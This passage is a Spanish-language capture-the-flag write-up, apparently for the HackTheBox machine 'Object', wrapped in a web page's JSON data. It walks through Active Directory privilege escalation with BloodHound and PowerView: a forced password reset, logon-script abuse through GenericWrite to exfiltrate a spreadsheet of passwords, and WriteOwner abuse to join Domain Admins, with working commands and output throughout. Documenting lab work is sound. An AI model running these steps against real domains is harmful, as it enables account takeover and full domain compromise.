Name\\n----                -------------         ------ ----\\n-a----        6/21/2022   6:40 AM           9060 20220621064046_BloodHound.zip\\n-a----        6/21/2022   6:40 AM          10043 MWU2MmE0MDctMjBkZi00N2VjLTliOTMtYThjYTY4MjdhZDA2.bin\\n-a----        6/21/2022   6:35 AM         974235 SharpHound.ps1\\n-ar---        6/21/2022   4:56 AM             34 user.txt\\n\\n~~~\\n\\nDescargamos el archivo .zip\\n\\n## Elevación de privilegios\\n\\nLo importamos en bloodhound y luego buscamos el path mas corto para llegar a admin\\n\\n![](/Object/Pasted_image_20220621111052.png)\\n\\n- Desde oliver a smith forcechangepassword\\n- Desde smith a maria GenericWrite\\n- Desde maria a Administrador WriteOwner\\n\\nPara entender como explotar el cambio de contraseña para el usuario smith presionamos click derecho sobre ForceChangePassword\\n\\n![](/Object/Pasted_image_20220621111719.png)\\n\\n![](/Object/Pasted_image_20220621111731.png)\\n\\n## Consiguiendo el usuario Smith \\n\\nNos sugiere instalar powerview y hacer el cambio de contraseña con esta herramienta:\\n\\n~~~powershell\\n . .\\\\powerview.ps1\\n~~~\\nLuego ejecutamos los siguientes comandos:\\n\\n~~~powershell\\n$newpass = ConvertTo-SecureString 'Password1234#' -AsPlainText -Force\\n~~~\\n\\n~~~powershell\\nSet-DomainUserPassword -Identity smith -AccountPassword $newpass\\n~~~\\n\\nAhora el usuario smith posee las siguientes credenciales\\n\\n- User: smith\\n- Password: Password1234#\\n\\nVerificamos si tenemos acceso al sistema mediante WinRM con el usuario smith\\n\\n~~~powershell\\nevil-winrm -i 10.129.90.135 -u smith -p 'Password1234#'                            \\n\\nEvil-WinRM shell v3.3\\n\\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\\n\\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\\n\\nInfo: Establishing connection to remote endpoint\\n\\n*Evil-WinRM* PS C:\\\\Users\\\\smith\\\\Documents\u003e \\n~~~\\n\\n## Consiguiendo el usuario Maria\\n\\nPara conseguir acceso al usuario maria, Bloodhound nos sugiere utilizar nuevamente el modulo powerview.ps1 junto con sus componentes Set-DomainObject y Get-DomainSPNTicket\\n\\nSin embargo, el ataque no fue exitoso, Hacktricks sugiere que se puede usar el GenericWrite para modificar los script de logon.\\n\\nhttps://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse#genericwrite-on-user\\n\\nPor lo que usamos los siguientes comandos\\n\\n~~~powershell \\necho \\\"ls \\\\users\\\\maria \u003e c:\\\\tmp\\\\out\\\" \u003e cmd.ps1\\n~~~\\n\\n~~~powershell\\nSet-DomainObject -Identity maria -SET @{scriptpath=\\\"C:\\\\\\\\tmp\\\\\\\\cmd.ps1\\\"}\\n~~~\\n\\nLuego leemos el archivo out y vemos lo siguiente\\n\\n~~~powershell\\ntype out\\n\\n\\n    Directory: C:\\\\users\\\\maria\\n\\n\\nMode                LastWriteTime         Length Name\\n----                -------------         ------ ----\\nd-r---       10/22/2021   3:54 AM                3D Objects\\nd-r---       10/22/2021   3:54 AM                Contacts\\nd-r---       10/25/2021   3:47 AM                Desktop\\nd-r---       10/25/2021  10:07 PM                Documents\\nd-r---       10/22/2021   3:54 AM                Downloads\\nd-r---       10/22/2021   3:54 AM                Favorites\\nd-r---       10/22/2021   3:54 AM                Links\\nd-r---       10/22/2021   3:54 AM                Music\\nd-r---       10/22/2021   3:54 AM                PictuObject\\nd-r---       10/22/2021   3:54 AM                Saved Games\\nd-r---       10/22/2021   3:54 AM                Searches\\nd-r---       10/22/2021   3:54 AM                Videos\\n~~~\\n\\nNotamos que el directorio Documents ha sifo modificado recientemente\\n\\n~~~powershell\\necho \\\"ls \\\\users\\\\maria\\\\desktop \u003e \\\\tmp\\\\out \\\" \u003e cmd.ps1\\n~~~\\n \\n Y conseguimos el siguiente archivo\\n \\n~~~powershell\\ncat out\\n\\nDirectory: C:\\\\users\\\\maria\\\\desktop\\n\\n\\nMode                LastWriteTime         Length Name\\n----                -------------         ------ ----\\n-a----       10/26/2021   8:13 AM           6144 Engines.xls\\n\\n ~~~\\n\\nModificamos el archivo cmd.ps1:\\n\\n~~~powershell\\necho \\\"copy \\\\users\\\\maria\\\\desktop\\\\Engines.xls  \\\\tmp\\\\ \\\" \u003e cmd.ps1\\n~~~\\n\\n\\n~~~powershell\\nls\\n\\n\\n    Directory: C:\\\\tmp\\n\\n\\nMode                LastWriteTime         Length Name\\n----                -------------         ------ ----\\n-a----        6/21/2022   8:03 AM             96 cmd.ps1\\n-a----       10/26/2021   8:13 AM           6144 Engines.xls\\n-a----        6/21/2022   8:02 AM            830 out\\n-a----        6/21/2022   7:59 AM            830 out2\\n\\n~~~\\n\\n\\nDescargamos el archivo a nuestra VM. Luego convertimos el archivo a csv\\n\\n~~~bash\\nssconvert Engines.xls engine.csv\\n~~~\\n\\nY vemos su contenido\\n\\n~~~bash\\ncat engine.csv                           \\n\\\"Machines Information\\\",,,,,\\nName,Quantity,\\\"Date Acquired\\\",Owner,\\\"Chamber Username\\\",\\\"Chamber Password\\\"\\n\\\"Internal Combustion Engine\\\",12,2021/10/02,HTB,maria,d34gb8@\\n\\\"Stirling Engine\\\",23,2021/11/05,HTB,maria,0de_434_d545\\n\\\"Diesel Engine\\\",4,2021/02/03,HTB,maria,W3llcr4ft3d_4cls\\n~~~\\n\\nIntentamos acceder al sistema mediante WinRM como el usuario maria utilizando las contraseñas indicadas en el CSV\\n\\n## Administrador\\n\\nBloodHound nuevamente nos sugiere instalar el modulo PowerView para luego modificar  el grupo de administradores y hacer que maria sea parte de este grupo\\n\\nDefinimos a maria como el dueño del grupo Domain Admins\\n\\n~~~powershell\\nSet-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'maria'\\n~~~\\n\\nAsiganmos todos los derechos del grupo a maria\\n\\n~~~powershell\\nAdd-DomainObjectAcl -TargetIdentity \\\"Domain Admins\\\" -PrincipalIdentity maria -Rights All\\n~~~\\n\\nAgregamos a maria al grupo Domain Admins\\n\\n~~~powershell\\nAdd-DomainGroupMember -Identity 'Domain Admins' -Members 'maria'\\n~~~\\n\\nVerificamos a que grupos pertenece maria\\n\\n~~~powershell\\n*Evil-WinRM* PS C:\\\\Users\\\\maria\\\\Documents\u003e net user maria\\nUser name                    maria\\nFull Name                    maria garcia\\nComment\\nUser's comment\\nCountry/region code          000 (System Default)\\nAccount active               Yes\\nAccount expires              Never\\n\\nPassword last set            10/21/2021 9:16:32 PM\\nPassword expires             Never\\nPassword changeable          10/22/2021 9:16:32 PM\\nPassword required            Yes\\nUser may change password     Yes\\n\\nWorkstations allowed         All\\nLogon script                 C:\\\\\\\\tmp\\\\\\\\cmd.ps1\\nUser profile\\nHome directory\\nLast logon                   6/21/2022 4:56:41 AM\\n\\nLogon hours allowed          All\\n\\nLocal Group Memberships      *Remote Management Use\\nGlobal Group memberships     *Domain Admins        *Domain Users\\nThe command completed successfully.\\n~~~\\n\\nFinalmente tenemos acceso como Administrador al sistema\"}"},"__N_SSG":true},"page":"/posts/post/[slug]","query":{"slug":"Object"},"buildId":"8FBaA9tE3H2FwnNG4HFAa","assetPrefix":"/nextjs-github-pages","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>